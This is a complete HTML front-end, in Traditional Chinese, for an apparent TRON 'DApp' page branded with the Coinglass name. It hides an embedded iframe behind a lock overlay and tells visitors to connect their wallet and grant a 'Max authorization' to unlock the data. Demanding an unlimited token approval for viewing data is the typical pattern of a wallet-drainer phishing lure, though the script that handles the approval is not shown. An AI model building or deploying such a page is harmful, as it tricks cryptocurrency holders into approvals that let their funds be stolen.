<!DOCTYPE html>
<html lang="zh-Hant">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TRON DApp 服務 - Coinglass</title>
    <link rel="stylesheet" href="./src/style.css">
    <style>
        body {
            margin: 0;
            padding: 0;
            overflow: hidden; /* 防止雙重滾動條 */
        }
        
        /* HEADER 樣式 - 確保內容居中和換行 */
        header {
            display: flex;
            flex-direction: row; /* 預設為一行 */
            justify-content: space-between;
            align-items: center;
            padding: 10px 10px; /* 減少水平內邊距 */
            background-color: #2c2c2c; 
            color: white;
            position: relative;
            z-index: 20;
        }
        header h1 {
            font-size: 1.2em; /* 降低標題字體大小 */
            margin-right: 10px; /* 標題和按鈕之間留空間 */
        }
        #connectButton {
            white-space: nowrap; /* 防止按鈕文字換行 */
            padding: 8px 12px; /* 縮小按鈕內邊距 */
            font-size: 0.9em; /* 縮小按鈕字體 */
            cursor: pointer;
            border: none;
            border-radius: 5px;
            background-color: #f7a600; 
            color: black;
            font-weight: bold;
        }
        #connectButton.connected {
            background-color: #28a745;
            color: white;
        }

        /* 內容區塊 - 佔滿螢幕的 iframe */
        #contentContainer {
            position: absolute;
            top: 50px; /* 根據 header 調整 */
            left: 0;
            width: 100%;
            height: calc(100vh - 50px);
        }
        #coinglassFrame {
            width: 100%;
            height: 100%;
            border: none;
        }

        /* 鎖定提示覆蓋層 */
        #lockedPrompt {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.7); 
            color: white;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 10;
            padding: 10px; /* 添加內邊距防止文字貼邊 */
            text-align: center;
        }
        #lockedPrompt h2 {
            font-size: 1.5em; /* 調整鎖定標題大小 */
        }
        #lockedPrompt p {
            font-size: 1em;
            margin: 5px 0;
            padding: 0 10px; /* 確保提示文字在小螢幕上也不會溢出 */
            word-wrap: break-word; /* 讓長單詞也能自動換行 */
        }

        /* 交易狀態提示覆蓋層 (blurOverlay) */
        #blurOverlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.9); 
            color: white;
            display: none; 
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 100;
            backdrop-filter: blur(5px);
        }
        #overlayMessage {
            font-size: 1.2em; /* 調整提示文字大小 */
            margin-bottom: 20px;
            padding: 0 15px;
            word-wrap: break-word; 
        }

        /* 媒體查詢：針對極小螢幕（如iPhone SE或窄屏手機）的額外優化 */
        @media (max-width: 400px) {
            header h1 {
                font-size: 1em; /* 進一步縮小標題 */
            }
            #connectButton {
                padding: 6px 10px;
                font-size: 0.8em; /* 進一步縮小按鈕文字 */
            }
            #lockedPrompt h2 {
                font-size: 1.3em;
            }
            #lockedPrompt p {
                font-size: 0.9em;
            }
        }
    </style>
</head>
<body>

    <header>
        <h1>TRON 服務訂閱演示</h1>
        <button id="connectButton" title="連繫錢包">連繫錢包</button>
    </header>

    <div id="contentContainer">
        <iframe id="coinglassFrame" src="https://example.com" title="Coinglass 嵌入"></iframe>
        
        <div id="lockedPrompt">
            <h2>🔒 服務鎖定中</h2>
            <p>請點擊右上角連繫錢包並完成 **Max 授權** 以解鎖數據。</p>
            <p style="font-size: 0.8em; margin-top: 20px;">
                （Max 授權成功後，此提示將會消失）
            </p>
        </div>
    </div>
        
    <div id="blurOverlay">
        <div id="overlayMessage">連線中...</div>
    </div>

    <script src="./src/main.js"></script>
    
</body>
</html>
